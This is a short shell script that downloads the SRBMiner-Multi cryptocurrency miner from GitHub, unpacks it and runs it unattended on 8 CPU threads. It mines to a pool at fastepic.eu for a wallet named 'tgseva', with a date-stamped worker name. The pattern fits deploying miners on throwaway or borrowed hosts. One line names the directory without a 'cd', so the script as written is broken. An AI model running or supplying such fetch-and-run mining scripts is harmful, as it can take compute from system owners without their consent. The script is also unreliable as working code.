#!/bin/sh
myworker=$(date +'%d%m')
apt install libc6 -y
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.2.9/SRBMiner-Multi-2-2-9-Linux.tar.xz
tar -xvf SRBMiner-Multi-2-2-9-Linux.tar.xz
SRBMiner-Multi-2-2-9
chmod 700 SRBMiner-MULTI
chmod +x SRBMiner-MULTI
./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool stratum+ssl://fastepic.eu:3418 --wallet tgseva."'${myworker}_innew'" --password x --cpu-threads 8

